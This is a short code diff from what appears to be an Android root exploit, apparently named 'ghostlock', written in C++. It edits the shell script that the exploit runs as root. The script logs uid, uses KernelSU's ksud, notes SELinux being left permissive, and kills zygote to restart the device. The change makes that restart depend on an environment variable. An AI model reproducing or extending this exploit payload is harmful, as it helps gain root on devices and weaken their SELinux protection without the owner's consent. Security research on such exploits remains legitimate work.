@@ -239,6 +239,7 @@ namespace ghostlock::attack {
             "HOME_DIR='%s'\n"
             "LOG='%s'\n"
             "SAFE_MODE=%d\n"
+            "SOFT_RESTART=%d\n"
             "KSUD=\"$HOME_DIR/ksud\"\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
@@ -411,13 +412,16 @@ namespace ghostlock::attack {
             "fi\n"
             "else\n"
             "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
-            "echo '[+] Soft restarting the device now' >>\"$LOG\"\n"
-            "sleep 5\n"
-            "pkill -9 -f zygote\n"
+            "fi\n"
+            "if [ \"$SOFT_RESTART\" = \"1\" ]; then\n"
+            "  echo '[+] Soft restarting the device now' >>\"$LOG\"\n"
+            "  sleep 5\n"
+            "  pkill -9 -f zygote\n"
             "fi\n",
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
             session::g_exploit_session.profile.safe_mode() ? 1 : 0,
+            (getenv("GHOSTLOCK_SOFT_RESTART") && std::string_view(getenv("GHOSTLOCK_SOFT_RESTART")) == "1") ? 1 : 0,
             (config::runtime_config_snapshot().debug_dir.c_str()));
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
